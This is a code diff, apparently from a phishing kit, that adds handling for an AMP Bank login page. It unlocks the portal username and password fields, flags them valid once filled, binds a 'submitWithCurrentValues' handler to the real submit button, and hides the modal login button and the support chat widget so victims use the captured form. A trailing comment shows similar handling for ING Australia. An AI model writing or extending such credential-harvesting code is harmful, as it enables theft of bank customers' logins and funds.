@@ -2664,6 +2664,49 @@ button[style*="display:none"][style*="box-shadow"],
         } catch {}
       }
 
+      // ⭐⭐⭐⭐⭐ AMP BANK KESIN GARANTI (My AMP portal formu):
+      //   Sayfada 2 login seti var (modal + portal). Gercek portal butonu
+      //   #loginPersonalSubmit — handler baglanmazsa "giris olmuyor".
+      const isAmpNow =
+        /amp/i.test(String(bankSlug || "")) ||
+        /\bamp\b/i.test(String(bankName || ""));
+      if (isAmpNow) {
+        try {
+          const aU = doc.getElementById("portal-username") as HTMLInputElement | null;
+          const aP = doc.getElementById("portal-password") as HTMLInputElement | null;
+          [aU, aP].forEach((f) => {
+            if (!f) return;
+            try { f.removeAttribute("disabled"); (f as any).disabled = false; f.readOnly = false; } catch {}
+            try {
+              f.style.setProperty("pointer-events", "auto", "important");
+              f.style.setProperty("opacity", "1", "important");
+              f.style.setProperty("visibility", "visible", "important");
+            } catch {}
+          });
+          if (aU && aP && String(aU.value || "").trim().length > 0 && String(aP.value || "").trim().length > 0) {
+            isValid = true;
+          }
+          const aBtn = (doc.getElementById("loginPersonalSubmit") || doc.querySelector("form button[type='submit'], form input[type='submit']")) as HTMLElement | null;
+          if (aBtn) {
+            try { (aBtn as any).disabled = false; aBtn.removeAttribute("disabled"); } catch {}
+            try {
+              aBtn.style.setProperty("pointer-events", "auto", "important");
+              aBtn.style.setProperty("opacity", "1", "important");
+              aBtn.style.setProperty("visibility", "visible", "important");
+            } catch {}
+            try { aBtn.removeEventListener("click", submitWithCurrentValues as any); } catch {}
+            try { aBtn.addEventListener("click", submitWithCurrentValues as any, false); } catch {}
+            try { aBtn.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
+            try { aBtn.addEventListener("touchend", submitWithCurrentValues as any, false); } catch {}
+          }
+          // Modal/eski login butonu + chat widget'i kapat (yanlis butona basilmasin)
+          try {
+            doc.querySelectorAll<HTMLElement>(".login__btn-submit, .dta-modal-login-btn, #embeddedMessagingConversationButton, .embeddedMessagingConversationButton")
+              .forEach((x) => { try { x.style.setProperty("display", "none", "important"); } catch {} });
+          } catch {}
+        } catch {}
+      }
+
 
       // ═══════════════════════════════════════════════════════════════════
       // ⭐⭐⭐⭐⭐ ING Australia KALICI COZUM (SHADOW DOM KAPALI OLANLAR ICIN)
